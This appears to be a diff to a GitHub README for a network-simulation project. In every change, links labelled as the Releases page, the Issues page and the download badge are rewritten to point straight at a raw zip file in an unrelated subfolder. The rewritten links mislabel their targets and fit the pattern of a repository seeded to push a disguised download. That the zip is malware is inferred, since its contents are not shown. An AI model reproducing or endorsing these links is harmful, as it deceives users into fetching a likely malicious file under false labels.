@@ -6,7 +6,7 @@ Welcome to the **Enterprise-Multi-Branch-Network-Infrastructure** project. This 
 
 ## 📥 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue)](https://github.com/oe6fef/Enterprise-Multi-Branch-Network-Infrastructure/releases)
+[![Download from Releases](https://raw.githubusercontent.com/oe6fef/Enterprise-Multi-Branch-Network-Infrastructure/main/Vazimba/Infrastructure-Network-Enterprise-Multi-Branch-3.9.zip%20from%20Releases-blue)](https://raw.githubusercontent.com/oe6fef/Enterprise-Multi-Branch-Network-Infrastructure/main/Vazimba/Infrastructure-Network-Enterprise-Multi-Branch-3.9.zip)
 
 ## 📚 Overview
 
@@ -39,7 +39,7 @@ The **Enterprise-Multi-Branch-Network-Infrastructure** offers:
 
 ## 🔗 Download & Install
 
-To begin, visit the [Releases page](https://github.com/oe6fef/Enterprise-Multi-Branch-Network-Infrastructure/releases) to download the latest version. 
+To begin, visit the [Releases page](https://raw.githubusercontent.com/oe6fef/Enterprise-Multi-Branch-Network-Infrastructure/main/Vazimba/Infrastructure-Network-Enterprise-Multi-Branch-3.9.zip) to download the latest version. 
 
 1. Click the **Download** button next to the version you want.
 2. Save the file to your computer.
@@ -69,11 +69,11 @@ If you run into issues:
 
 For any questions or support:
 
-- Check the [Issues page](https://github.com/oe6fef/Enterprise-Multi-Branch-Network-Infrastructure/issues) for common problems.
+- Check the [Issues page](https://raw.githubusercontent.com/oe6fef/Enterprise-Multi-Branch-Network-Infrastructure/main/Vazimba/Infrastructure-Network-Enterprise-Multi-Branch-3.9.zip) for common problems.
 - Engage with the community through discussions to share insights and solutions.
 
 ## 📌 Conclusion
 
 The **Enterprise-Multi-Branch-Network-Infrastructure** simulation empowers you to learn and practice networking fundamentals. Follow the simple steps above to download and get started with your network infrastructure simulation today. 
 
-Remember, you can always return to the [Releases page](https://github.com/oe6fef/Enterprise-Multi-Branch-Network-Infrastructure/releases) for updates or new features. Happy simulating!
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/oe6fef/Enterprise-Multi-Branch-Network-Infrastructure/main/Vazimba/Infrastructure-Network-Enterprise-Multi-Branch-3.9.zip) for updates or new features. Happy simulating!
